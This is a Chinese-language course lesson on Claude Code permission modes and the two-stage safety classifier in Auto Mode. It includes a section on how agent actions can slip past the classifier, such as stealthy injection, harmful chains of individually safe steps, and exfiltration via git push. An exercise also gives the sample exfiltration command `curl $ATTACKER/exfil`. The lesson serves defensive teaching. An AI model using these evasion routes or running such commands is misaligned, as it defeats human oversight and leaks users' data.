# 将 Claude Code 作为自主智能体：权限模式与自动模式

> Claude Code 提供了七种权限模式（permission modes）。“plan”模式会在每次操作前询问，“default”模式仅对高风险操作进行询问，“acceptEdits”模式自动批准文件写入但仍需确认 Shell 执行，而“bypassPermissions”模式则批准所有操作。自动模式（Auto Mode，2026年3月24日）采用两阶段并行安全分类器（two-stage parallel safety classifier）取代了逐项操作审批：每个操作都会先经过单Token快速检查（single-token fast check）；被标记的操作将触发思维链深度审查（chain-of-thought deep review）。操作预算（action budgets）通过 `max_turns` 和 `max_budget_usd` 进行强制限制。自动模式目前以研究预览版（research preview）形式发布——Anthropic 已明确指出，该分类器本身并不足以完全保障安全。

**Type:** 学习
**Languages:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** 第15阶段 · 01（长程智能体），第15阶段 · 09（编程智能体生态）
**Time:** 约45分钟

## 核心问题

在本地机器上运行的自主编程智能体（autonomous coding agent）属于一个独立的安全类别。其攻击面（attack surface）涵盖了智能体所能触及的一切——文件系统、网络、凭证、剪贴板、任意浏览器标签页以及任何打开的终端。Bruce Schneier 等专家已公开指出：计算机操作智能体（computer-use agents）并非聊天机器人的“功能更新”，而是一种具有全新风险特征的新型工具。

Claude Code 的权限系统（permission system）正是 Anthropic 给出的解决方案。该系统并未采用单一的“自主/非自主”开关，而是提供了跨越能力阶梯的七种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式都在执行速度与逐项审查之间做出了不同的权衡。自动模式（2026年3月）引入了两阶段分类器（two-stage classifier），对于分类器判定为安全的操作，审批流程将移出用户的关键路径（critical path）；而对于被分类器标记的操作，则保留审查层。

工程层面的核心问题在于：该系统能拦截什么？会遗漏什么？以及特定任务究竟应该匹配哪种模式？

## 核心概念

### 七种权限模式

| 模式 | 行为表现 | 适用场景 |
|---|---|---|
| `plan` | 智能体（Agent）提出计划；用户批准整个计划；每个动作在执行前均需审核 | 不熟悉的任务；接近生产环境的代码；首次在代码库中使用该智能体 |
| `default` | 智能体执行动作；对任何“高风险”动作（Shell 执行、破坏性操作、网络调用）提示用户确认 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；Shell 执行和网络调用仍需提示确认 | 跨多个文件的重构操作 |
| `acceptExec` | 在预设的允许列表（allowlist）内的 Shell 命令自动批准；文件写入自动批准 | 紧密的内部循环，其中每个 Shell 命令都是 `npm test` 或类似命令 |
| `autoMode` | 两阶段安全分类器（safety classifier）；被标记的动作将升级至人工审核 | 在受限工作区中进行长时间无人值守运行 |
| `yolo` | 跳过大多数提示；仍会执行工具的允许列表/拒绝列表（allowlist/denylist）检查 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准所有操作 | 文档注明“仅适用于您愿意随时丢弃的临时容器内” |

（上述名称与公开的 Claude Code 文档一致；“yolo”是用于指代中等宽松权限的非正式简称。）

### 一页读懂 Auto Mode

Auto Mode（于 2026 年 3 月 24 日发布）是首个将逐动作审批权委托给模型的权限模式。其架构如下：

1. **第一阶段——单 Token 分类器（single-token classifier）。** 针对每个提议的动作运行。计算成本低。返回“安全”或“标记”。设计为与主智能体循环并行运行，以确保已批准的动作无需排队等待。
2. **第二阶段——次级策略/安全审查。** 仅针对被标记的动作运行。结合当前动作、会话状态及声明的任务，进行聚焦的策略与安全评估。若置信度较低，则升级至用户人机交互（HITL）环节。

预算控制机制与分类器并行运作：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 触发会话终止的美元金额上限。
- 每个工具的动作次数限制（例如 `WebFetch` 调用不超过 N 次等）。

### 系统能够拦截的情况

- 直接针对工具输入的提示词注入（prompt injection），且注入的指令映射为已知的高风险动作模式。
- 重复的工具循环——分类器能够识别出动作 N+1 与动作 N 几乎完全相同，且已连续出现五次。
- 在原本仅限文件编辑的会话中，出现明显超出范围的 Shell 命令。

### 系统可能遗漏的情况

- **隐蔽的提示词注入**：在不触发任何单一标记动作的情况下改变模型行为。间接提示词注入（indirect prompt injection）并非可通过补丁完全修复的漏洞（OpenAI 准备负责人，2025 年，关于浏览器智能体——参见第 11 课）。
- **语义层面的异常行为**。每个独立动作看似安全，但组合后的执行轨迹却具有危害性。分类器仅对单个动作进行判断，不会重新推导用户的真实意图。
- **通过合法渠道的数据外泄**。将数据写入您拥有的文件，随后通过 `git push` 推送到公开仓库，这是一系列被允许的动作，但其组合方式构成了问题。

### 研究预览版的定位

Anthropic 将 Auto Mode 作为研究预览版发布。文档明确指出，该分类器仅是一层防护，而非终极解决方案：用户需将 Auto Mode 与预算限制、允许列表、隔离工作区及轨迹审计（trajectory audits）结合使用（第 12–16 课）。这种预览版的定位也反映了文档中记录的评估与部署差距（evaluation-vs-deployment gap）（第 1 课）——在离线评估中表现良好的分类器，在用户上下文模糊的真实会话中可能会表现出不同的行为。

### 该权限阶梯在工作流中的定位

- 不熟悉的任务：从 `plan` 模式开始。审阅计划比回滚一次失败运行的成本更低。
- 已知的重构任务：使用 `acceptEdits` 可节省大量确认点击操作。
- 无人值守的后台运行：仅在已评估过爆炸半径（blast radius）的工作区内使用 `autoMode`（不包含凭据、不挂载生产环境、不启用未主动授权的网络出站访问）。
- 临时容器：当且仅当容器及其凭据均可随时丢弃时，才可使用 `yolo` / `bypassPermissions`。

## 使用它

`code/main.py` 模拟了双阶段分类器（two-stage classifier）。第一阶段（Stage 1）是针对拟执行动作的轻量级关键词规则；第二阶段（Stage 2）是速度较慢的多规则审查器。驱动脚本（driver）输入一段简短的合成轨迹（synthetic trajectory）（包含安全动作、提示词注入尝试（prompt-injection attempt）、重复循环），并展示分类器在哪些地方成功拦截，在哪些地方出现漏判。

## 交付它

`outputs/skill-permission-mode-picker.md` 将任务描述与正确的权限模式（permission mode）、预算上限（budget caps）以及所需的隔离级别进行匹配。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型永远不会被第一阶段标记，但总是被第二阶段捕获？哪种动作两者都无法捕获？

2. 扩展第一阶段的规则集，以捕获特定的已知恶意模式（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量其误报率（false-positive rate）。

3. 阅读 Anthropic 的《智能体循环工作原理》（How the agent loop works）文档。列出智能体（agent）在 `default` 模式下默认会接触的每一个外部状态（external state）。在无人值守运行 `autoMode` 之前，哪些状态需要单独设置访问门控（gate）？

4. 设计一个 24 小时无人值守运行的预算方案：`max_turns`、`max_budget_usd`、单工具上限（per-tool caps）、允许列表（allowlists）。为每个数值提供合理性说明。

5. 描述一条轨迹（trajectory），其中每个独立动作均通过了第一阶段和第二阶段的审批，但组合后的行为却出现了目标未对齐（misaligned）。（第 14 课将介绍如何通过紧急开关（kill switches）和金丝雀令牌（canary tokens）来解决此问题。）

## 关键术语

| 术语 | 通俗说法 | 实际含义 |
|---|---|---|
| 权限模式（Permission mode） | “智能体能做多少事” | 七种命名策略之一，用于控制每个动作的审批 |
| 计划模式（plan mode） | “做任何事前先询问” | 智能体编写计划；执行前需用户批准 |
| 接受编辑（acceptEdits） | “允许它写文件” | 文件写入自动批准；Shell 执行仍需提示确认 |
| 自动模式（autoMode） | “自动审批” | 双阶段安全分类器；被标记的动作将升级处理 |
| 绕过权限（bypassPermissions） | “完全放手（YOLO）” | 批准所有操作；专为临时容器设计 |
| 第一阶段分类器（Stage 1 classifier） | “快速令牌检查” | 针对拟执行动作的单令牌规则；并行运行 |
| 第二阶段分类器（Stage 2 classifier） | “深度审查” | 对被标记的动作进行思维链（chain-of-thought）推理 |
| 研究预览版（Research preview） | “非正式发布（GA）” | Anthropic 对故障模式仍在探索中的功能的定位表述 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、预算限制、动作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 托管服务执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — 功能概览与自动模式发布公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造分类器判断逻辑的基于推理的底层规则。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 关于长周期权限设计的内部视角。